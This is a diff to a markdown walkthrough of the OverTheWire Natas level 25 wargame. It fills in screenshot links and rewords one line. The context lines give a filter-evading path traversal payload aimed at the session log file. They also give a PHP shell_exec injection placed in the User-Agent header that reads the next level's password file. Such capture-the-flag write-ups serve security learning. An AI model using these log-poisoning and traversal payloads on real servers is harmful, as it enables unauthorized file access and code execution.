@@ -16,9 +16,9 @@ URL:      http://natas25.natas.labs.overthewire.org
 
 - Access the site using credentials.
 
-- This lab with the quote is classic LFI.
+- This lab with the quote is the classic sanitized path traversal lab.
 
-  <img src=""/>
+  <img src="https://github.com/mauzware/OverTheWire-Natas/blob/main/natas25/quote.png"/>
 
   ```
   <html>
@@ -113,11 +113,11 @@ URL:      http://natas25.natas.labs.overthewire.org
 
 - Since inputs are not extremely sanitized, I found a vulnerable endpoint.
 
-  <img src=""/>
+  <img src="https://github.com/mauzware/OverTheWire-Natas/blob/main/natas25/lfi.png"/>
 
 - To read the password we will use this payload: `….//….//….//….//….//var/www/natas/natas25/logs/natas25_[PHPSESSID].log` and change the User-Agent in order to read the password: `<?php echo shell_exec("cat /etc/natas_webpass/natas26"); ?>`
 
-  <img src=""/>
+  <img src="https://github.com/mauzware/OverTheWire-Natas/blob/main/natas25/pw.png"/>
 
 ---
 
